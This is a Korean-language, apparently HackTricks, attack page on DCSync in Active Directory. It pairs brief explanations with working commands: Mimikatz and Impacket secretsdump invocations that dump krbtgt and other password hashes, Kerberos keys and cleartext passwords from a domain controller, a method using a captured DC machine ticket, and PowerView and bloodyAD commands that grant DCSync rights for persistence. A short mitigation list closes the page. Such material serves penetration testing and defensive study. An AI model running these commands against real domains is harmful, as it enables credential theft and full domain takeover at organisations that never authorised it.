# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 권한은 도메인 자체에 대해 다음 권한을 가진다는 것을 의미합니다: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** 및 **Replicating Directory Changes In Filtered Set**.

**DCSync에 대한 중요한 참고 사항:**

- **DCSync 공격은 Domain Controller의 동작을 시뮬레이션하고 다른 Domain Controller들에게 Directory Replication Service Remote Protocol (MS-DRSR)을 사용해 정보를 복제하도록 요청합니다**. MS-DRSR은 Active Directory의 유효하고 필수적인 기능이므로 끌 수 없고 비활성화할 수도 없습니다.
- 기본적으로 **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** 그룹만 필요한 권한을 가집니다.
- 실제로 **full DCSync**는 도메인 naming context에서 **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** 이 필요합니다. `DS-Replication-Get-Changes-In-Filtered-Set`은 보통 이들과 함께 위임되지만, 단독으로는 full krbtgt dump보다 **confidential / RODC-filtered attributes**(예: legacy LAPS-style secrets)를 동기화하는 데 더 관련이 있습니다.
- 일부 계정 비밀번호가 reversible encryption으로 저장되어 있다면, Mimikatz에서 비밀번호를 clear text로 반환하는 옵션을 사용할 수 있습니다

### Enumeration

`powerview`를 사용해 이 권한을 가진 계정을 확인하세요:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
DCSync 권한이 있는 **기본값이 아닌 principals**에 집중하고 싶다면, 기본 제공 replication-capable groups를 제외하고 예상치 못한 trustees만 검토하세요:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### 로컬에서 Exploit하기
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### 원격으로 Exploit하기
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
실용적인 범위 지정 예제:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### 캡처한 DC machine TGT (ccache)를 사용한 DCSync

unconstrained-delegation export-mode 시나리오에서는 Domain Controller machine TGT(예: `DC1$@DOMAIN` for `krbtgt@DOMAIN`)를 캡처할 수 있습니다. 그런 다음 해당 ccache를 사용해 DC로 인증하고 비밀번호 없이 DCSync를 수행할 수 있습니다.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
운영 노트:

- **Impacket의 Kerberos 경로는 DRSUAPI 호출 전에 먼저 SMB를 거칩니다**. 환경에서 **SPN target name validation**을 강제하면, 전체 dump가 `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`로 실패할 수 있습니다.
- 이 경우, 먼저 대상 DC에 대한 **`cifs/<dc>`** service ticket를 요청하거나, 즉시 필요한 계정에 대해 **`-just-dc-user`**로 전환하세요.
- 더 낮은 replication rights만 가진 경우에도, LDAP/DirSync 스타일 syncing은 전체 krbtgt replication 없이도 **confidential** 또는 **RODC-filtered** attributes(예: legacy `ms-Mcs-AdmPwd`)를 여전히 노출할 수 있습니다.

`-just-dc`는 3개의 파일을 생성합니다:

- **NTLM hashes**가 들어있는 파일 1개
- **Kerberos keys**가 들어있는 파일 1개
- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)이 활성화된 계정의 NTDS에서 가져온 cleartext passwords가 들어있는 파일 1개. reversible encryption이 설정된 사용자는 다음으로 확인할 수 있습니다:

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

도메인 관리자라면, `powerview`의 도움으로 이 permissions를 어떤 사용자에게든 부여할 수 있습니다:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux 운영자는 `bloodyAD`로도 동일하게 할 수 있습니다:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
그런 다음, 출력에서 이를 확인하여 사용자가 3개의 권한을 올바르게 할당받았는지 **확인**할 수 있습니다( "ObjectType" 필드 안에서 권한 이름을 볼 수 있어야 합니다):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – 개체에 대해 작업이 수행됨
- Security Event ID 5136 (Audit Policy for object must be enabled) – directory service 개체가 수정됨
- Security Event ID 4670 (Audit Policy for object must be enabled) – 개체의 권한이 변경됨
- AD ACL Scanner - ACL의 create 및 비교 reports를 생성하고 비교합니다. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
